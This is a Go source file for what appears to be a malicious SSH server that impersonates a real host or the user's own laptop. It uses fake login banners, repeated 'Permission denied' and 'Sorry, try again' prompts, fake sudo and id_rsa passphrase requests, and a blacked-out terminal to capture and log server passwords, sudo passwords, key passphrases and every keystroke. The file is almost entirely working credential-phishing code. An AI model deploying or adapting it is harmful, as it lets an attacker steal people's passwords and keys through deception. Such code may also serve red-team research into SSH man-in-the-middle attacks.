package cmd

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"strings"
	"time"

	"golang.org/x/crypto/ssh"
)

var (
	sigKill                = "\x03"
	eof                    = "\x04"
	ubuntu1804LoginMessage = "\r\n Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.9.125-linuxkit x86_64) \r\n\r\n * Documentation:  https://help.ubuntu.com \r\n * Management:     https://landscape.canonical.com \r\n * Support:        https://ubuntu.com/advantage \r\n\r\nThis system has been minimized by removing packages and content that are not required on a system that users do not log into.  \r\n\r\nTo restore this content, you can run the 'unminimize' command.  \r\n\r\nThe programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright.  \r\n\r\nUbuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law."
	centosLoginMessage     = "Last failed login: Sun Feb 18 04:20:22 CET 2017 from 192.168.x.x on ssh:notty \r\nThere were 2 failed login attempts since the last successful login.\r\nLast login: Sun Feb 18 12:58:07 2017 from 192.168.x.x"
)

func exploit(channel ssh.Channel, connDetails map[string]string) {
	failedToLogin(channel, connDetails)
	pretendToBeUsersComputer(channel, connDetails)
}

func failedToLogin(channel ssh.Channel, connDetails map[string]string) {
	bio := bufio.NewReader(channel)
	// TODO listen for signals
	for i := 0; i < 3; i++ {
		io.WriteString(channel,
			fmt.Sprintf("\r\n%s@%s's password: ", connDetails["username"], connDetails["hostIP"]))
		sshPassword, _ := bio.ReadString('\r')
		sshPassword = strings.Replace(sshPassword, "\r", "", -1)
		log.Printf("Session %s: sshPassword \"%s\" ", connDetails["sessionID"], sshPassword)
		//		time.Sleep(1 * time.Second)
		io.WriteString(channel, "\r\nPermission denied, please try again.")
	}
	io.WriteString(channel,
		fmt.Sprintf("\r\n%s@%s: Permission Denied (publickey,password).", connDetails["username"], connDetails["hostIP"]))
}

func unlockKeychainTrick(channel ssh.Channel, connDetails map[string]string) {
	io.WriteString(channel, "\r\nAn application wants to access the private key but it is locked")
	sudoString := fmt.Sprintf("\r\n [sudo] password for %s: ", connDetails["user"])
	io.WriteString(channel, sudoString)
	bio := bufio.NewReader(channel)
	for i := 0; i < 3; i++ {
		time.Sleep(1 * time.Second)
		io.WriteString(channel, "\r\n Sorry, try again ")
		io.WriteString(channel, sudoString)
		keychainPassword, _ := bio.ReadString('\r')
		log.Printf("gnome-keyring password: %s", keychainPassword)
	}
}

func sshKeyFileLockedTrick(channel ssh.Channel, connDetails map[string]string) {
	bio := bufio.NewReader(channel)
	io.WriteString(channel, "\r\nEnter passphrase for id_rsa:")
	keychainPassword, _ := bio.ReadString('\r')
	log.Println(keychainPassword)
	for i := 0; i < 3; i++ {
		io.WriteString(channel, "\r\n Bad passphrase, try again for id_rsa")
		keychainPassword, _ = bio.ReadString('\r')
		log.Printf(keychainPassword)
	}
}

func corruptedLoginTrick(channel ssh.Channel, connDetails map[string]string) {
	scanner := bufio.NewScanner(channel)
	io.WriteString(channel, ubuntu1804LoginMessage)
	corruptedPrompt := "\r\n/ $ pty failed to allocate"
	io.WriteString(channel, corruptedPrompt)
	scanner.Split(bufio.ScanBytes)
	var received strings.Builder
	var tok string
	for {
		scanner.Scan()
		tok = scanner.Text()
		// early breaks sigint or eof
		if tok == sigKill {
			break
		}
		if tok == eof {
			break
		}
		// replace carriage returns with newlines
		if tok == "\r" {
			tok = "\n"
		}
		received.WriteString(tok)
		if len(received.String()) > 3 &&
			string(received.String()[len(received.String())-4:]) == "exit" {
			break
		}
	}
	log.Println(received.String())
	io.WriteString(channel, "\r\nConnection to remote host ended ")
	received.Reset()
	// now we pretend to be the users local computer
	pretendToBeUsersComputer(channel, connDetails)
}

func passwordIncorrectTrick(channel ssh.Channel, connDetails map[string]string) {
	bio := bufio.NewReader(channel)
	passwordPrompt := fmt.Sprintf("\r\n%s@%s's password: ", connDetails["username"], connDetails["hostIP"])
	maxAttempts := 3
	for i := 0; i < 3; i++ {
		io.WriteString(channel, passwordPrompt)
		loginPassword, _ := bio.ReadString('\r')
		log.Println("Server password: ", loginPassword)
		if i < maxAttempts-1 {
			io.WriteString(channel, "\r\n Permission denied, please try again.")
		}
	}
	hideFurtherOutput(channel, connDetails)
}

func pretendToBeUsersComputer(channel ssh.Channel, connDetails map[string]string) {
	scanner := bufio.NewScanner(channel)
	scanner.Split(bufio.ScanBytes)
	var received strings.Builder
	var tok string
	// var hostname string
	// hostname = "ubuntu-laptop"
	// promptString := fmt.Sprintf("\r\n \033[01;32m%s@%s\033[01;00m:~$ ", connDetails["username"], hostname)
	promptString := "\r\n\x1b[32m➜ \x1b[0m\x1b[36m ~ \x1b[0m"
	io.WriteString(channel, promptString)
	for {
		scanner.Scan()
		tok = scanner.Text()
		// early breaks sigint or eof
		if tok == sigKill {
			continue
		}
		if tok == eof {
			continue
		}
		// echo the users keystrokes back to them
		io.WriteString(channel, tok)
		received.WriteString(tok)
		if tok == "\r" {
			// get commands being executed
			log.Printf("Session %s, user command \"%s\"", connDetails["sessionID"], strings.Replace(received.String(), "\r", "", -1))
			command := received.String()
			received.Reset()
			commandParts := strings.Fields(command)
			if len(commandParts) > 0 {
				if commandParts[0] == "sudo" {
					for i := 0; i < 3; i++ {
						sudoString := fmt.Sprintf("\r\nPassword: ")
						io.WriteString(channel, sudoString)
						for {
							scanner.Scan()
							tok = scanner.Text()
							if tok == "\r" {
								log.Printf("Session %s: sudo password: %s", connDetails["sessionID"], received.String())
								received.Reset()
								break
							}
							received.WriteString(tok)
						}
						io.WriteString(channel, "\r\nSorry, try again.")
					}
					hideFurtherOutput(channel, connDetails)
					break
				} else {
					permissionDeniedStr := fmt.Sprintf("\r\npermission denied: %s", commandParts[0])
					io.WriteString(channel, permissionDeniedStr)
				}
			}
			io.WriteString(channel, promptString)
		}
	}
}

func hideFurtherOutput(channel ssh.Channel, connDetails map[string]string) {
	// set the terminal background and text to be black
	io.WriteString(channel, "\u001b[30m \u001b[40m")
	// record anything that the user types
	scanner := bufio.NewScanner(channel)
	scanner.Split(bufio.ScanBytes)
	var received strings.Builder
	var tok string
	for {
		scanner.Scan()
		if err := scanner.Err(); err != nil {
			log.Println(received.String())
			break
		}
		tok = scanner.Text()
		if tok == "\r" {
			log.Printf("Session %s: user typed \"%s\"", connDetails["sessionID"], received.String())
			received.Reset()
			continue
		}
		if tok == sigKill || tok == eof {
			log.Printf("Session %s: user typed \"%s\"", connDetails["sessionID"], received.String())
			log.Printf("Session %s: session ended ", connDetails["sessionID"])
			channel.Close()
			break
		}
		received.WriteString(tok)
	}
}
